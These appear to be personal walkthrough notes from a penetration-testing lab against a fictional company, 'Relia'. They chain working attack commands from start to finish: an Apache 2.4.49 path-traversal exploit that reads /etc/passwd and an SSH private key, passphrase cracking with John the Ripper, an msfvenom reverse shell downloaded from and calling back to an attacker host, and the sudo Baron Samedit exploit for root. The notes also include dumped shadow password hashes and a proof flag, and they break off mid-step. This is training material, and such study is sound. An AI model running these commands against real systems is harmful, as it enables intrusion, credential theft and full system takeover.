# Questions
We are tasked with a penetration test of Relia, an industrial company building driving systems for the timber industry. The target got attacked a few weeks ago and wants now to get an assessment of their IT security. Their goal is to determine if an attacker can breach the perimeter and get access to the domain controller in the internal network.

# Scan the DMZ network
sudo nmap -sC -sV -T4 192.168.197.245-250 192.168.197.189,191
[port-scanning.md]

# Found some interesting port from .245 where it have 2222 running and 21
ssh root@192.168.197.245 -p 2222  
root@192.168.197.245: Permission denied (publickey).
# It required public key, lets try to access FTP port with anonymous user
ftp -p 203.0.113.0
# When prompted for a username, you can enter either “ftp” or “anonymous”. Both are same

# Unfortunately anonymous access FTP is not valid
# Lets focus on the web server, based on the port scanning results, we can see the Apache HTTP server is using 2.4.49
searchsploit apache 2.4.49
searchsploit -m 50383.sh  

# Run the exploitation
code targets.txt
bash 50383.sh targets.txt /etc/passwd
# Here we get some users lets update to user file
[user.txt]

# We can try to check on each user .ssh path 
# Common private key filename can refer to below 
id_rsa：RSA私钥文件。
id_dsa：DSA私钥文件（较少使用）。
id_ecdsa：ECDSA私钥文件（使用椭圆曲线加密算法）。
id_ed25519：Ed25519私钥文件（使用EdDSA算法）。
id_xmss：XMSS私钥文件（使用Hash-based签名算法）。

# Then we found anita user have id_edcsa
sudo bash 50383.sh targets.txt /home/anita/.ssh/id_ecdsa

# Then we found the privatekey require passphrase
ssh -i id_edcsa anita@192.168.197.245 -p 2222
Enter passphrase for key 'id_edcsa': 

# Use ssh2john to extract the hash
ssh2john id_edcsa > ssh.hash

hashcat -h | grep -i "ssh" 
...
22921 | RSA/DSA/EC/OpenSSH Private Keys ($6$)                      | Private Key
...
# Hashcat seem unable to crack we can try with JohntheRipper
john ssh.hash --wordlist=/usr/share/wordlists/rockyou.txt 
...
fireball         (id_edcsa) 
...

# SSH it with the password cracked again
cat local.txt

# Create stable listener
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.45.165 LPORT=8888 -f elf > cute.elf  
msfconsole
use multi/handler
set payload linux/x64/shell_reverse_tcp
set LHOST tun0
set LPORT 8888
set ExitonSession false
run -j
curl http://192.168.45.165:8088/Relia/cute.elf --output cute.elf
chmod 755 cute.elf
./cute.elf

# Upload the linpeas
sessions -i 1 -t 100
python3 -c 'import pty; pty.spawn("/bin/bash")'

curl http://192.168.45.165:8088/Linux/linpeas.sh --output linpeas.sh
chmod 755 linpeas.sh
anita@web01:/home/anita$ bash linpeas.sh
...
[+] [CVE-2021-3156] sudo Baron Samedit
[+] [CVE-2021-3156] sudo Baron Samedit 2
...

# Based on the linpeas results, it is suggested to use CVE-2021-3156 to exploit, We download the source code file from
# Reference https://github.com/worawit/CVE-2021-3156
anita@web01:/home/anita$ curl http://192.168.45.165:8088/Relia/WEB01/exploit_nss.py -o exp_nss.py
anita@web01:/home/anita$ python3 exp_nss.py
# Successful!
whoami
root
cd /root
cat proof.txt
2c3af8035e3c106f68501b857085372a
# Go to /tmp run the cute.elf again to establish a Full Interactive TTY
sessions -i 2 -t 100
python3 -c 'import pty; pty.spawn("/bin/bash")'

cd /home/anita
./linpeas
...
miranda:$6$01GOUNyvP1lFg0Id$QoFsKEsD4um4ctVU62MU/KEmQbdj0OSw7gJ6EXVA4YTjTNxvfzQxdhdsyjHUaw4qO0YAwEMoXUXWBdCd3zW4V.:19277:0:99999:7:::             
steven:$6$Rj4tu27TLjcnwC2v$wsNuqImPdduB9mXZHpjjEROvTKwWsp2SckcMB.AtcvHyS7tHTCGh.CrUCP0ogsFH9IjG3i2qekcAXRlkmeZOT1:19277:0:99999:7:::               
mark:$6$blWxRVRno5YcdGiN$6ekTTBXDvGfaFRSPxZVLhR8tAmFd20RLlXNL5Q8U44gp0Heq7MLmFZrlaHeaX.pFhlJ3lif10E1zsO3W2tdbC/:19277:0:99999:7:::                 
anita:$6$Fq6VqZ4n0zxZ9Jh8$4gcSpNrlib60CDuGIHpPZVT0g/CeVDV0jR3fkOC7zIEaWEsnkcQfKp8YVCaZdGFvaEsHCuYHbALFn49meC.Rj1:19277:0:99999:7:::   
offsec:$6$p6n32TS.3/wDw7ax$TNwiUYnzlmx7Q0w59MbhSRjqW37W20OpGs/fCRJ3XiffbBVQuZTwtGeIJglRJg0F0vFKNBT39a57gakRJ2zPw/:19277:0:99999:7:::              
$6$p6n32TS.3/wDw7ax$TNwiUYnzlmx7Q0w59MbhSRjqW37W20OpGs/fCRJ3XiffbBVQuZTwtGeI
...

# DEMO
# Use the same SSH methods like WEB01 on the DEMO
ssh -i id_edcsa anita@192.168.197.246 -p 2222
python3 -c 'import pty; pty.spawn("/bin/bash")'
anita@demo:/tmp$ hostname
demo
anita@demo:$ cat local.txt
# Curl linpeas and chmod 755
...
[+] [CVE-2021-3156] sudo Baron Samedit
[+] [CVE-2021-3156] sudo Baron Samedit 2
...

# Upload the same exploit script from WEB01

